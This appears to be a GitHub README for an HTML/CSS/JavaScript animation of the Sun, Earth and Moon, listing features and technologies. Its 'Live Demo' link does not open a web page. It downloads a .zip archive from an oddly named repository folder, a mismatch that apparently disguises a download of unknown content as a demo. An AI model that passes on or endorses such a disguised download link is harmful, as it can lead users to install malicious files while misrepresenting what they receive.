# 🌍 Sun-Earth-Moon Orbit Animation - Satya Sundar Dey

This project visualizes a **realistic orbital animation** of the Sun, Earth, and Moon using pure **HTML**, **CSS**, and **JavaScript**.  
It demonstrates how planetary motion works through smooth rotations and 3D-style perspectives.

## 🔗 Live Demo

👉 [View Demo](https://raw.githubusercontent.com/dotsatya/Sun-Earth-Moon/main/Pararctalian/Sun-Earth-Moon.zip)

---

## 🎯 Features

- ☀️ Central sun with glowing effect
- 🌎 Earth rotating around the sun
- 🌙 Moon rotating around the earth
- 🔄 Smooth CSS animations
- 🎨 3D illusion with shadows and scale
- 📱 Responsive design

---

## 🧠 Built With

- **HTML5**
- **CSS3** (Animations, Transforms)
- **Vanilla JavaScript**
